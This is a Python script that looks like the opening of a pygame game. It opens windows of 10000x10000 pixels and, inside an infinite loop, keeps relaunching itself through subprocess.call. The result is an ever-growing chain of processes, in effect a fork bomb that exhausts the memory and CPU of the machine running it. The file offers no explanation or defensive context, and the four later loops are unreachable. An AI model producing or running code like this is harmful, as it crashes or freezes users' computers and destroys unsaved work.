import subprocess
import sys
import pygame
import random
import math
import time
import os
from pygame import mixer

# Initialize pygame
pygame.init()

# Create the screen
screen = pygame.display.set_mode((10000, 10000))
screen_2 = pygame.display.set_mode((10000, 10000))
screen_3 = pygame.display.set_mode((10000, 10000))
screen_4 = pygame.display.set_mode((10000, 10000))
screen_5 = pygame.display.set_mode((10000, 10000))

running = True
while running:
    screen.fill((0, 0, 0))
    subprocess.call([sys.executable, os.path.realpath(__file__)] + sys.argv[1:])

running = True
while running:
    screen_2.fill((0, 0, 0))
    subprocess.call([sys.executable, os.path.realpath(__file__)] + sys.argv[1:])

running = True
while running:
    screen_3.fill((0, 0, 0))
    subprocess.call([sys.executable, os.path.realpath(__file__)] + sys.argv[1:])

running = True
while running:
    screen_4.fill((0, 0, 0))
    subprocess.call([sys.executable, os.path.realpath(__file__)] + sys.argv[1:])

running = True
while running:
    screen_5.fill((0, 0, 0))
    subprocess.call([sys.executable, os.path.realpath(__file__)] + sys.argv[1:])